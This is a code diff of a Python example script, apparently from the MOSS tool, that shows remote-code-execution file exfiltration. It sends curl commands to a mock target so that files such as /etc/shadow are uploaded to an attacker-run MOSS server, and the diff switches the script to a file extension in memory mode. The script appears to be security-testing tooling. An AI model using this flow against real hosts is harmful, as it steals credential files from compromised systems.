@@ -1,5 +1,5 @@
 """
-RCE curl file exfiltration — uses upload extension to capture files
+RCE curl file exfiltration — uses file extension to capture files
 sent via curl from a compromised target.
 
 When --target is given, sends curl commands to a mock RCE server
@@ -15,7 +15,6 @@ Usage (terminal 2 — attacker):
 import sys
 import os
 import argparse
-import time
 
 import httpx
 
@@ -23,7 +22,7 @@ sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
 from moss.moss import MossBuilder
 
 
-FILES = ["/etc/shadow", "C:\Windows\win.ini"]
+FILES = ["/etc/shadow", "C:\\Windows\\win.ini"]
 
 
 def send_curl_cmd(target_url, curl_cmd):
@@ -37,7 +36,7 @@ def send_curl_cmd(target_url, curl_cmd):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="RCE curl file exfiltration via MOSS upload",
+        description="RCE curl file exfiltration via MOSS file extension",
     )
     parser.add_argument("--hostname", default="localhost",
                         help="Public hostname reachable from the target")
@@ -49,11 +48,12 @@ def main():
                         help="Mock RCE target URL — sends curl commands here for execution")
     args = parser.parse_args()
 
-    # Step 1 ── Start MOSS with upload ──────────────────────────────────
+    # Step 1 ── Start MOSS with file extension in memory mode ────────────
     builder = MossBuilder(args=[
         "-p", str(args.port),
         "--hostname", args.hostname,
-        "-e", "upload",
+        "-e", "file",
+        "-d", "[[memory]]",
         "--filter", "upload",
     ])
     runner = builder.api()
@@ -67,7 +67,7 @@ def main():
 
     # Step 2 ── Send curl commands to target via --target ───────────────
     origin = f"http://{args.hostname}:{args.port}"
-    
+
     print(f"Sending curl commands to mock target at {args.target}")
     print()
     for f in FILES:
@@ -93,10 +93,11 @@ def main():
 
     # Step 4 ── List captured files ─────────────────────────────────────
     print("--- Captured files ---")
-    uploaded = server.list_uploaded_files()
+    bp = server.fileserver_url_path.rstrip('/')
+    uploaded = [(k, v) for k, v in server.files.items() if k.startswith(bp + '/')]
     if uploaded:
-        for fname in uploaded:
-            content = server.get_uploaded_file(fname)
+        for key, (mime, content) in sorted(uploaded):
+            fname = key[len(bp) + 1:]
             size = len(content) if content else 0
             print(f"\n  {fname}  ({size} bytes)")
             if content and size <= 4096:
